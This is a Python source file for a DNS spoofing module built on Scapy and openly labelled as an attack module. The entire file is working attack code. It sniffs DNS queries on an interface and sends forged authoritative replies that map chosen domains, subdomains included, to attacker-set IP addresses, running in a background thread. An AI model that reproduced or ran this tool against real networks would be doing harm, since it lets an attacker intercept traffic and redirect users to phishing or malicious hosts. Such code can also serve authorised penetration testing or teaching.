"""DNS spoofing attack module"""

import threading
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sniff, send
from scapy.error import Scapy_Exception
from logger import Logger

logger = Logger("dns_spoof")


class DNSSpoofing:
    """DNS spoofing engine that intercepts DNS queries and replies with spoofed IPs."""

    def __init__(self, interface):
        self.interface = interface
        self.spoofed_domains = {}  # domain -> IP mapping
        self._running = False
        self._sniffer_thread = None
        self._packets_processed = 0
        logger.info(f"DNSSpoofing initialized on {interface}")

    def add_spoof(self, domain, spoof_ip):
        """Add domain to spoofing list"""
        self.spoofed_domains[domain.lower()] = spoof_ip
        logger.info(f"Added spoof: {domain} -> {spoof_ip}")

    def remove_spoof(self, domain):
        """Remove domain from spoofing list"""
        if domain.lower() in self.spoofed_domains:
            del self.spoofed_domains[domain.lower()]
            logger.info(f"Removed spoof: {domain}")
            return True
        return False

    def _process_packet(self, packet):
        """Process DNS packet"""
        try:
            if not (IP in packet and UDP in packet and DNS in packet):
                return None

            dns_layer = packet[DNS]

            # Only handle DNS queries
            if dns_layer.qr != 0:
                return None

            # Check if we should spoof this query
            for question in dns_layer.qd:
                query_name = question.qname.decode("utf-8").rstrip(".")

                # Check for exact match
                spoof_ip = None
                for domain, ip in self.spoofed_domains.items():
                    if query_name.lower() == domain or query_name.lower().endswith(
                        "." + domain
                    ):
                        spoof_ip = ip
                        break

                if spoof_ip:
                    logger.info(f"Spoofing DNS query: {query_name} -> {spoof_ip}")

                    # Build response packet
                    response = (
                        IP(dst=packet[IP].src, src=packet[IP].dst)
                        / UDP(dport=packet[UDP].sport, sport=53)
                        / DNS(id=dns_layer.id, qr=1, aa=1, rcode=0)
                    )

                    response[DNS].an = DNSRR(
                        rrname=question.qname,
                        type=question.qtype,
                        ttl=300,
                        rdata=spoof_ip,
                    )

                    response[DNS].ancount = 1

                    self._packets_processed += 1
                    return response

        except (UnicodeDecodeError, AttributeError, IndexError, KeyError) as e:
            logger.error(f"Error processing DNS packet: {e}")

        return None

    def _packet_callback(self, packet):
        """Callback for packet processing"""
        try:
            spoofed_response = self._process_packet(packet)
            if spoofed_response:
                send(spoofed_response, verbose=False)
        except (RuntimeError, OSError, ValueError, AttributeError) as e:
            logger.error(f"Error in packet callback: {e}")

    def start(self):
        """Start DNS spoofing"""
        if self._running:
            logger.warning("DNS spoofing already running")
            return False

        if not self.spoofed_domains:
            logger.warning("No spoofed domains configured")
            return False

        try:
            self._running = True
            self._packets_processed = 0

            self._sniffer_thread = threading.Thread(
                target=self._sniffer_loop, daemon=True
            )
            self._sniffer_thread.start()

            logger.info("DNS spoofing started")
            return True

        except (RuntimeError, OSError, ValueError) as e:
            logger.error(f"Failed to start DNS spoofing: {e}")
            self._running = False
            return False

    def _sniffer_loop(self):
        """Main sniffer loop"""
        try:
            sniff(
                iface=self.interface,
                prn=self._packet_callback,
                filter="udp port 53",
                store=False,
                stop_filter=lambda x: not self._running,
            )
        except (Scapy_Exception, OSError, RuntimeError) as e:
            logger.error(f"Error in sniffer loop: {e}")
            self._running = False

    def stop(self):
        """Stop DNS spoofing"""
        if not self._running:
            logger.warning("DNS spoofing not running")
            return False

        try:
            self._running = False

            if self._sniffer_thread:
                self._sniffer_thread.join(timeout=5)

            logger.info(
                f"DNS spoofing stopped (processed {self._packets_processed} packets)"
            )
            return True

        except (RuntimeError, OSError, Scapy_Exception) as e:
            logger.error(f"Error stopping DNS spoofing: {e}")
            return False

    def get_stats(self):
        """Get spoofing statistics"""
        return {
            "running": self._running,
            "packets_processed": self._packets_processed,
            "spoofed_domains": len(self.spoofed_domains),
            "domains": list(self.spoofed_domains.keys()),
        }
